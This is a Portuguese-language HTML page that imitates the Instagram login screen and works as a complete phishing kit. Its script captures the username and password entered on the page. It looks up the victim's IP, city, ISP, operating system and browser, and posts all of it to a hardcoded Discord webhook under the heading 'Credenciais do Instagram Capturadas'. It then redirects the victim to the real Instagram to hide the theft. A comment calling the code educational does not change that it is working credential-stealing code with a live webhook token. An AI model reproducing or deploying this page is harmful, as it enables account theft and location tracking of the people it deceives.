<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram</title>
    <link rel="icon" type="image/png" href="https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            color: #262626;
            font-size: 14px;
            line-height: 18px;
        }
        
        .flex {
            display: flex;
        }
        
        .direction-column {
            flex-direction: column;
        }
        
        .align-items-center {
            align-items: center;
        }
        
        .justify-content-center {
            justify-content: center;
        }
        
        .flex-wrap {
            flex-wrap: wrap;
        }
        
        main {
            margin-top: 32px;
            margin-bottom: 32px;
            padding: 0 20px;
        }
        
        #auth {
            max-width: 350px;
            width: 100%;
        }
        
        .panel {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            margin-bottom: 10px;
            padding: 10px;
        }
        
        .login {
            padding: 20px 40px;
        }
        
        h1 {
            margin: 22px auto 12px;
        }
        
        h1 img {
            width: 175px;
        }
        
        form {
            margin-top: 24px;
            width: 100%;
        }
        
        input {
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 14px;
            padding: 9px 8px;
            width: 100%;
            margin-bottom: 6px;
        }
        
        button {
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-weight: 600;
            padding: 5px 9px;
            width: 100%;
            cursor: pointer;
            margin-top: 8px;
            height: 30px;
        }
        
        .separator {
            margin: 18px 0;
        }
        
        .separator span {
            background-color: #dbdbdb;
            height: 1px;
            width: 100%;
        }
        
        .or {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
            text-transform: uppercase;
        }
        
        .login-with-fb {
            margin-bottom: 20px;
        }
        
        .login-with-fb div {
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .login-with-fb img {
            width: 16px;
            height: 16px;
            margin-right: 8px;
        }
        
        .login-with-fb a {
            color: #385185;
            font-weight: 600;
            text-decoration: none;
        }
        
        .register {
            padding: 20px;
        }
        
        .register p {
            margin-right: 5px;
        }
        
        .register a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .app-download {
            margin: 20px 0;
        }
        
        .app-download p {
            margin-bottom: 20px;
        }
        
        .app-download img {
            height: 40px;
            margin: 0 4px;
        }
        
        footer {
            padding-bottom: 52px;
            margin: 0 auto;
            max-width: 1012px;
        }
        
        footer ul {
            list-style: none;
            margin-bottom: 20px;
        }
        
        footer li {
            margin-bottom: 8px;
            margin-right: 12px;
        }
        
        footer a {
            color: #8e8e8e;
            text-decoration: none;
            font-size: 12px;
        }
        
        .copyright {
            color: #8e8e8e;
            font-size: 12px;
            text-align: center;
        }

        .loading-overlay {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(255,255,255,0.9);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            font-family: Arial, sans-serif;
            font-size: 18px;
            color: #555;
            display: none;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3897f0;
            border-radius: 50%;
            width: 32px;
            height: 32px;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loading-overlay" id="loading">
        <div class="spinner"></div> Redirecionando para o Instagram...
    </div>

    <main class="flex align-items-center justify-content-center">
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 class="flex justify-content-center">
                    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram logo" />
                </h1>

                <form id="loginForm">
                    <input id="email" name="email" type="text" placeholder="Telefone, nome de usuário ou e-mail" required />
                    <input id="password" name="password" type="password" placeholder="Senha" required />
                    <button type="submit">Entrar</button>
                </form>

                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OU</div>
                    <span></span>
                </div>

                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y5/r/TJztmXM_FkK.png" alt="Facebook Icon">
                        <a href="#">Entrar com o Facebook</a>
                    </div>
                    <a href="#">Esqueceu a senha?</a>
                </div>
            </div>

            <div class="panel register flex justify-content-center">
                <p>Não tem uma conta?</p>
                <a href="#">Cadastre-se</a>
            </div>

            <div class="app-download flex direction-column align-items-center">
                <p>Obtenha o aplicativo.</p>
                <div class="flex justify-content-center">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_portuguese-brazilian-pt_br.png/68006a2bb372.png" alt="Apple Store" />
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_portuguese-brazilian-pt_br.png/2f2a0c05b2f3.png" alt="Google Play" />
                </div>
            </div>
        </section>
    </main>

    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">SOBRE</a></li>
            <li><a href="#">AJUDA</a></li>
            <li><a href="#">IMPRENSA</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">CARREIRAS</a></li>
            <li><a href="#">PRIVACIDADE</a></li>
            <li><a href="#">TERMOS</a></li>
            <li><a href="#">LOCALIZAÇÃO</a></li>
            <li><a href="#">IDIOMA</a></li>
        </ul>
        <p class="copyright">© 2023 Instagram do Meta</p>
    </footer>

    <script>
        // IMPORTANTE: Este código é apenas para fins educacionais
        // Use apenas em ambiente local para entender como funciona
        
        // Webhook do Discord para receber os dados
        const webhook = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2";
        
        // Função para mostrar o carregamento
        function showLoading() {
            document.getElementById('loading').style.display = 'flex';
        }
        
        // Função para obter informações do IP
        async function getIPInfo() {
            try {
                // Primeiro obter o IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                // Depois obter mais informações sobre o IP
                const infoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const ipInfo = await infoResponse.json();
                
                return {
                    ip: ipData.ip,
                    country: ipInfo.country_name || 'Desconhecido',
                    region: ipInfo.region || 'Desconhecido',
                    city: ipInfo.city || 'Desconhecido',
                    isp: ipInfo.org || 'Desconhecido',
                    latitude: ipInfo.latitude,
                    longitude: ipInfo.longitude,
                    timezone: ipInfo.timezone || 'Desconhecido'
                };
            } catch (error) {
                console.error('Erro ao obter informações de IP:', error);
                return {
                    ip: 'Desconhecido',
                    country: 'Desconhecido',
                    region: 'Desconhecido',
                    city: 'Desconhecido',
                    isp: 'Desconhecido'
                };
            }
        }
        
        // Função para enviar dados para o webhook
        async function sendToWebhook(data) {
            try {
                const response = await fetch(webhook, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
                
                return response.ok;
            } catch (error) {
                console.error('Erro ao enviar para webhook:', error);
                return false;
            }
        }
        
        // Detectar sistema operacional e navegador
        function detectUserInfo(userAgent) {
            let os = "Desconhecido";
            let browser = "Desconhecido";
            
            // Sistema operacional
            if (userAgent.includes("Windows")) {
                os = "Windows";
            } else if (userAgent.includes("Mac OS")) {
                os = "MacOS";
            } else if (userAgent.includes("Linux")) {
                os = "Linux";
            } else if (userAgent.includes("Android")) {
                os = "Android";
            } else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) {
                os = "iOS";
            }
            
            // Navegador
            if (userAgent.includes("Firefox")) {
                browser = "Firefox";
            } else if (userAgent.includes("Chrome")) {
                browser = "Chrome";
            } else if (userAgent.includes("Safari")) {
                browser = "Safari";
            } else if (userAgent.includes("Edge")) {
                browser = "Edge";
            } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
                browser = "Opera";
            }
            
            return { os, browser };
        }
        
        // Manipular envio do formulário
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            showLoading();
            
            // Obter valores do formulário
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const userAgent = navigator.userAgent;
            
            // Obter informações do IP
            const ipInfo = await getIPInfo();
            
            // Detectar sistema e navegador
            const deviceInfo = detectUserInfo(userAgent);
            
            // Criar payload para enviar ao Discord
            const payload = {
                username: "Instagram Logger",
                avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/2048px-Instagram_icon.png",
                embeds: [{
                    title: "📱 Credenciais do Instagram Capturadas",
                    color: 0xE1306C,
                    fields: [
                        {
                            name: "📧 Usuário/Email",
                            value: "```" + email + "```",
                            inline: true
                        },
                        {
                            name: "🔑 Senha",
                            value: "```" + password + "```",
                            inline: true
                        },
                        {
                            name: "🌐 Informações de IP",
                            value: "```IP: " + ipInfo.ip + "\nPaís: " + ipInfo.country + "\nRegião: " + ipInfo.region + "\nCidade: " + ipInfo.city + "\nISP: " + ipInfo.isp + "```",
                            inline: false
                        },
                        {
                            name: "📟 Informações do Dispositivo",
                            value: "```Sistema: " + deviceInfo.os + "\nNavegador: " + deviceInfo.browser + "```",
                            inline: false
                        },
                        {
                            name: "📅 Data e Hora",
                            value: "```" + new Date().toLocaleString() + "```",
                            inline: false
                        }
                    ],
                    footer: {
                        text: "Instagram Login Capture"
                    },
                    timestamp: new Date().toISOString()
                }]
            };
            
            // Enviar para o webhook
            console.log("Enviando dados para webhook...");
            const success = await sendToWebhook(payload);
            
            if (success) {
                console.log("Dados enviados com sucesso!");
            } else {
                console.error("Falha ao enviar dados.");
            }
            
            // Redirecionar para o Instagram real após um pequeno atraso
            setTimeout(function() {
                window.location.href = "https://www.instagram.com/";
            }, 1500);
        });
    </script>
</body>
</html>
